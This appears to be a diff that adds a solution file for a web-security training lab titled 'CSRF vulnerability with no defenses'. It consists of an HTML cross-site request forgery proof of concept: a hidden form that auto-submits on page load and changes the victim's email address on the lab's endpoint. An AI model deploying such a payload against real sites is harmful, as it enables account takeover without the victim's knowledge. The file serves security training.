@@ -1,0 +1,7 @@
+# CSRF vulnerability with no defenses
+<form method="POST" action="https://ac4e1f1b1f760d6780fd07fd00d700d6.web-security-academy.net/email/change-email">
+     <input type="hidden" name="email" value="test@test.com">
+</form>
+<script>
+      document.forms[0].submit();
+</script>
